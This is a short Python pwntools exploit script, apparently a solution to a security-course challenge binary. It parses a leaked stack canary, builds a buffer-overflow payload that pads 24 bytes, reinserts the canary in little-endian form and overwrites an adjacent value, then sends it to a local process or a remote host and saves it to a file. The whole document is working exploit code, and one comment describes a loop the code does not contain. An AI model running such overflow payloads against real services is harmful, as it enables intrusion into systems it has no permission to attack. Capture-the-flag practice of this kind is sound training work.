from pwn import *
import sys

# Buffer size is not 16 on the server
LOCAL_BUFF_SIZE = 16
ACTUAL_BUFF_SIZE = 24


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# GDB script
gdb_script = """
break *0x08049333
break *0x0804930d
continue
"""
# Prepare program
exe = "/home/k-730/COMP6841/wk2/alive/challenge"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

# Run the debugger

# We first need to hit the canary!
# Create a loop until we encounter "YOu're not the messiah!"
io = start()
io.recvuntil(b"The canary is ", drop=True)
canary = int(io.recvlinesS(numlines=1)[0])
# Make sure the canary is in little endian form
print(canary)
canaryEndian = canary.to_bytes(4, "little")
# Read in the canary
info("Canary is %d\n", canary)
info(f"Canary in little endian is {canaryEndian}\n")

# Add the canary below but into little endian form
payload = ACTUAL_BUFF_SIZE * b"A" + canaryEndian + b"\x01\x00\x00\x00"
io.sendline(payload)
warn(io.recvall())

with open("exploit.txt", "wb+") as f:
    f.write(payload)

# sys.stdout.buffer.write(16 * b"A" + b"\xff")
